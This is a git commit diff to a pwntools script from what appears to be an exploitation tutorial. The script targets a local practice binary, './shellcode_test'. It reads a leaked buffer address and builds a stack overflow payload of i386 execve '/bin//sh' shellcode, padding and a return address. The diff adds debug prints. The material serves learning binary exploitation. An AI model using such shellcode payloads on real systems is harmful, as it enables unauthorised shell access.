b9e5d511c2596f569b73c89c25ecd187a80def2b
fepfitra <fitriansyahekaputra2001@mail.ugm.ac.id>
2023-05-24 08:13:37 +0700

    relearn pwn

--- IPBU Rev Engine/Tutorial 21/payload.py
+++ IPBU Rev Engine/Tutorial 21/payload.py
@@ -3,15 +3,23 @@ import struct
 
 context(arch='i386', os='linux')
 p = process('./shellcode_test')
+print("process:", p)
+
 output = p.recvuntil("Buffer ada di: ")
 
-buffer = int(p.recvline(),16)
-buff_byte = struct.pack("<I", buffer)
+buffer = p.recvline()
+print("buffer: ", buffer)
 
-print hex(buffer)
+buffer = int(buffer,16)
+print("buffer: ", buffer)
+
+buff_byte = struct.pack("<I", buffer)
+print("buff_byte: ", buff_byte)
 
 offset = 68
 shellcode = '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
+print("shellcode", disasm(shellcode))
+
 sc_len = len(shellcode)
 
 payload = shellcode + "A" * (offset - sc_len) + buff_byte
